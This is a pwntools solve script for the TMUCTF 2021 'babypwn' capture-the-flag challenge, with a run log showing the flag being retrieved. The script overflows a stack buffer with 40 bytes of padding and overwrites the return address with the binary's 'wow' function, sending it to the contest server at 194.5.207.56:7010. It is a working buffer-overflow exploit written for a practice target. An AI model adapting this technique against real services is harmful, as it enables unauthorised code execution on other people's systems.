from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './babypwn'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "194.5.207.56"
  PORT = 7010
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

buf  = "A"*40
buf += p64(elf.sym.wow)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Baby_Pwn$ python solve.py  r
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Baby_Pwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 194.5.207.56 on port 7010: Done
[*] Switching to interactive mode
=================================================================
=       _____ __  __ _   _  ___ _____ ___   ___ __ ___ _        =
=      |_   _|  \/  | | | |/ __|_   _| __| |_  )  \_  ) |       =
=        | | | |\/| | |_| | (__  | | | _|   / / () / /| |       =
=        |_| |_|  |_|\___/ \___| |_| |_|   /___\__/___|_|       =
=                                                               =
=================================================================
Hi, Please enter your name: 
TMUCTF{w0w!_y0u_c0uld_f1nd_7h3_w0w!}
'''

